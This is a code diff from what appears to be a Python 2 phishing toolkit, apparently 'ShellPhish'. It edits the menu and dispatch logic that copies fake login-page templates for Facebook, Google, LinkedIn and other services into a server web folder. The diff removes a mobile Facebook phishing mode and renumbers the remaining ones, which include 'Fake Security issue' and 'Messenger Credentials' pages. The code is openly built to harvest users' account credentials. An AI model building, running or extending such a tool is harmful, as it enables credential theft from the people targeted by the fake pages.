@@ -75,12 +75,10 @@ def runPhishing(social, option2):
     if option2 == '1' and social == 'Facebook':
         copy_tree("WebPages/fb_standard/", "Server/www/")
     if option2 == '2' and social == 'Facebook':
-        copy_tree("WebPages/fb_advanced_poll/", "Server/www/")  
+        copy_tree("WebPages/fb_advanced_poll/", "Server/www/")     
     if option2 == '3' and social == 'Facebook':
-        copy_tree("WebPages/mobile_fb/", "Server/www/")   
-    if option2 == '4' and social == 'Facebook':
         copy_tree("WebPages/fb_security_fake/", "Server/www/")  
-    if option2 == '5' and social == 'Facebook':
+    if option2 == '4' and social == 'Facebook':
         copy_tree("WebPages/fb_messenger/", "Server/www/")         
     elif option2 == '1' and social == 'Google':
         copy_tree("WebPages/google_standard/", "Server/www/")
@@ -183,7 +181,7 @@ def runPEnv():
     option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, END))
     if option == '1':
         loadModule('Facebook')
-        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Mobile Version(mobile_mode)\n\n {0}[{1}4{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}5{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
         runPhishing('Facebook', option2)
     elif option == '2':
         loadModule('Google')
